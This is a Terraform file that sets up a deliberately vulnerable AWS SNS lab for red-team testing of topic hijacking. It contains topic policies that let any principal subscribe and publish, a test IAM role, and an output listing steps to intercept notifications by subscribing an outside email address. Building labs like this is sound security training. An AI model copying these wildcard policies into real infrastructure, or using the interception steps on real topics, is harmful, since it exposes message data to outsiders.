# Vulnerable SNS Topic Infrastructure
# This Terraform configuration creates a vulnerable SNS topic that can be exploited

terraform {
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
  }
}

provider "aws" {
  region = var.aws_region
}

variable "aws_region" {
  description = "AWS region to deploy resources"
  type        = string
  default     = "us-east-1"
}

variable "environment" {
  description = "Environment name"
  type        = string
  default     = "redteam-test"
}

# Vulnerable SNS Topic with overly permissive policy
resource "aws_sns_topic" "vulnerable_notifications" {
  name = "${var.environment}-vulnerable-notifications"

  tags = {
    Environment = var.environment
    Purpose     = "Red Team Testing - Vulnerable Configuration"
    Attack      = "SNS Topic Hijacking"
  }
}

# Overly permissive topic policy - VULNERABLE
resource "aws_sns_topic_policy" "vulnerable_policy" {
  arn = aws_sns_topic.vulnerable_notifications.arn

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "AllowPublicSubscribe"
        Effect = "Allow"
        Principal = "*"  # VULNERABILITY: Allows anyone to subscribe
        Action = [
          "sns:Subscribe",
          "sns:Receive"
        ]
        Resource = aws_sns_topic.vulnerable_notifications.arn
      },
      {
        Sid    = "AllowCrossAccountPublish"
        Effect = "Allow"
        Principal = "*"  # VULNERABILITY: Allows anyone to publish
        Action = [
          "sns:Publish"
        ]
        Resource = aws_sns_topic.vulnerable_notifications.arn
        Condition = {
          StringLike = {
            "aws:PrincipalArn" = "arn:aws:iam::*:*"  # Too broad condition
          }
        }
      }
    ]
  })
}

# Additional vulnerable topic for testing different scenarios
resource "aws_sns_topic" "admin_alerts" {
  name = "${var.environment}-admin-alerts"

  tags = {
    Environment = var.environment
    Purpose     = "Red Team Testing - Admin Notifications"
    Attack      = "SNS Topic Hijacking"
  }
}

# Policy that allows subscription but tries to restrict publishing
resource "aws_sns_topic_policy" "admin_alerts_policy" {
  arn = aws_sns_topic.admin_alerts.arn

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "AllowAnyoneToSubscribe"
        Effect = "Allow"
        Principal = "*"  # VULNERABILITY: Too permissive
        Action = [
          "sns:Subscribe"
          # Removed "sns:ConfirmSubscription" - not valid for topic policies
        ]
        Resource = aws_sns_topic.admin_alerts.arn
      },
      {
        Sid    = "AllowAdminPublish"
        Effect = "Allow"
        Principal = {
          AWS = "arn:aws:iam::${data.aws_caller_identity.current.account_id}:root"
        }
        Action = [
          "sns:Publish"
        ]
        Resource = aws_sns_topic.admin_alerts.arn
      }
    ]
  })
}

# Create an SQS queue that will be subscribed to demonstrate impact
resource "aws_sqs_queue" "legitimate_processor" {
  name = "${var.environment}-legitimate-processor"

  tags = {
    Environment = var.environment
    Purpose     = "Legitimate message processor"
  }
}

# Subscribe the legitimate queue to the vulnerable topic
resource "aws_sns_topic_subscription" "legitimate_subscription" {
  topic_arn = aws_sns_topic.vulnerable_notifications.arn
  protocol  = "sqs"
  endpoint  = aws_sqs_queue.legitimate_processor.arn
}

# Allow SNS to send messages to SQS
resource "aws_sqs_queue_policy" "legitimate_processor_policy" {
  queue_url = aws_sqs_queue.legitimate_processor.id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Principal = {
          Service = "sns.amazonaws.com"
        }
        Action   = "sqs:SendMessage"
        Resource = aws_sqs_queue.legitimate_processor.arn
        Condition = {
          ArnEquals = {
            "aws:SourceArn" = aws_sns_topic.vulnerable_notifications.arn
          }
        }
      }
    ]
  })
}

# IAM role that demonstrates what a red teamer might have
resource "aws_iam_role" "redteam_role" {
  name = "${var.environment}-redteam-role"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Action = "sts:AssumeRole"
        Effect = "Allow"
        Principal = {
          AWS = "arn:aws:iam::${data.aws_caller_identity.current.account_id}:root"
        }
      }
    ]
  })

  tags = {
    Environment = var.environment
    Purpose     = "Red Team Testing Role"
  }
}

# Limited SNS permissions that still allow exploitation
resource "aws_iam_role_policy" "redteam_sns_policy" {
  name = "${var.environment}-redteam-sns-policy"
  role = aws_iam_role.redteam_role.id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Action = [
          "sns:ListTopics",
          "sns:GetTopicAttributes",
          "sns:Subscribe",
          "sns:Unsubscribe",
          "sns:ListSubscriptions",
          "sns:ListSubscriptionsByTopic"
        ]
        Resource = "*"
      },
      {
        Effect = "Allow"
        Action = [
          "sns:Publish"
        ]
        Resource = [
          aws_sns_topic.vulnerable_notifications.arn,
          aws_sns_topic.admin_alerts.arn
        ]
      }
    ]
  })
}

# Data source to get current AWS account ID
data "aws_caller_identity" "current" {}

# Outputs for the red team assessment
output "vulnerable_topic_arn" {
  description = "ARN of the vulnerable SNS topic"
  value       = aws_sns_topic.vulnerable_notifications.arn
}

output "admin_alerts_topic_arn" {
  description = "ARN of the admin alerts topic"
  value       = aws_sns_topic.admin_alerts.arn
}

output "redteam_role_arn" {
  description = "ARN of the red team role"
  value       = aws_iam_role.redteam_role.arn
}

output "legitimate_queue_url" {
  description = "URL of the legitimate SQS queue"
  value       = aws_sqs_queue.legitimate_processor.id
}

output "aws_region" {
  description = "AWS region where resources are deployed"
  value       = var.aws_region
}

output "attack_commands" {
  description = "Commands to test the attack"
  value = <<-EOT
    # 1. Assume the red team role:
    aws sts assume-role --role-arn ${aws_iam_role.redteam_role.arn} --role-session-name RedTeamTest

    # 2. Use SESNSploit to enumerate topics:
    python3 main.py
    
    # 3. Subscribe your email to intercept notifications:
    aws sns subscribe --topic-arn ${aws_sns_topic.vulnerable_notifications.arn} --protocol email --notification-endpoint your-email@example.com

    # 4. Test publishing a message:
    aws sns publish --topic-arn ${aws_sns_topic.vulnerable_notifications.arn} --message "Test message from red team"
  EOT
}
